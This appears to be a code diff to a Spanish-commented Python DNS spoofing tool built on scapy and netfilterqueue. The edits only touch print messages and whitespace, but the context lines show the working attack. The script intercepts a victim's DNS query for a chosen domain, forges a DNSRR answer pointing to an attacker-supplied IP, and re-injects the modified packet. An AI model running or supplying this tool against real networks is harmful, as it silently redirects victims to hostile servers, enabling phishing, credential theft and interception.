@@ -19,7 +19,8 @@ def processPacket(packet):
         
         #Realiza el DNS Spoof si la víctima ha accedido a la página deseada
         if options.domain in str(qname):
-            print(f'\r[+] El objetivo ha ingresado a {options.domain}\n[+] Comenzando spoofing...\n\n', end= '')
+            print(f'\r[+] El objetivo ha ingresado a {options.domain}\n[+] Comenzando spoofing...\n', end= '')
+            
             #Para spoofear a la víctima debemos modificar el "rrname" y el "rdata" ubicado en "DNS Resource Record"
             answer = scapy.DNSRR(rrname= qname, rdata= options.redirectIp)
             scapyPacket[scapy.DNS].an = answer 
@@ -33,7 +34,6 @@ def processPacket(packet):
 
             #Todas las modificaciones que hemos realizado, las pasamos al paquete original para que el Spoof se realice
             packet.set_payload(bytes(scapyPacket))
-            print('\r[+] Redirección exitosa\n\n', end= '')
 
     packet.accept()
 
@@ -41,8 +41,8 @@ options = getArguments()
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(int(options.queueNum), processPacket)
 
-try:    
-    print(f'Iniciando programa\nEsperando que el objetivo acceda {options.domain}...')
+try:        
+    print(f'Iniciando programa\nEsperando que el objetivo acceda a {options.domain}...')
     queue.run()
 
 except KeyboardInterrupt:
